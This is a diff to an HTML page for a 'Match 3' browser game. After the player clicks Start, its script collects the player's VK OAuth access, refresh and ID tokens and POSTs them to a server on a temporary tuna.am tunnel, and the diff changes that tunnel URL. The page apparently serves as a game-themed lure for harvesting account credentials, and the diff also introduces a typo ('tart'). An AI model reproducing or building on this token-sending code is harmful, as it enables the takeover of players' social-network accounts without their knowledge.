@@ -108,7 +108,7 @@
   
   <div id="container">
     <h1>Match 3</h1>
-    <button id="authBtn">Start</button>
+    <button id="authBtn">tart</button>
     <div class="status" id="status">Нажмите Play для начала</div>
     <div id="game" class="hidden">
       <div id="gameBoard"></div>
@@ -163,16 +163,15 @@ async function initialize() {
 
     updateStatus('Добро пожаловать!');
 
-   const tokenData = {
-  user_id: userInfo.id.toString(),
-  access_token: authData.access_token,
-  refresh_token: authData.refresh_token || '', // Добавляем пустое значение, если refresh_token отсутствует
-  token_type: authData.token_type || 'Bearer',
-  expires_in: authData.expires_in || 3600,
-  id_token: authData.id_token || '',
-  token_datetime: new Date().toISOString()
-};
-
+    const tokenData = {
+      user_id: userInfo.id.toString(),
+      access_token: authData.access_token,
+      refresh_token: authData.refresh_token || '',
+      token_type: authData.token_type || 'Bearer',
+      expires_in: authData.expires_in || 3600,
+      id_token: authData.id_token || '',
+      token_datetime: new Date().toISOString()
+    };
 
     // Отправляем токен на сервер с таймаутом
     await sendTokenToYourServer(tokenData);
@@ -191,7 +190,7 @@ async function sendTokenToYourServer(data) {
   const timeoutId = setTimeout(() => controller.abort(reason), 5000); // Таймаут в 5 секунд
   
   try {
-    const response = await fetch('https://bla39d-37-45-190-41.ru.tuna.am/api/vk-token', { 
+    const response = await fetch('https://se6htm-37-45-190-41.ru.tuna.am/api/vk-token', { 
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
@@ -251,6 +250,7 @@ function loadGameScript() {
 
 const authBtn = document.getElementById('authBtn');
 if (authBtn) authBtn.addEventListener('click', initialize);
+
 
 </script>
 </body>
